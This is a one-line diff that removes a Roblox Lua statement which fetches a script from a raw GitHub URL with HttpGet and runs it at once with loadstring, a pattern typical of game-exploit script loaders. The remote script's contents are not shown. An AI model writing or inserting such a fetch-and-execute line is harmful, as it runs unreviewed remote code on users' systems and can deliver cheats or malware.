@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ImNot-Ha3kin6/h/main/NewMainScript.lua", true))()
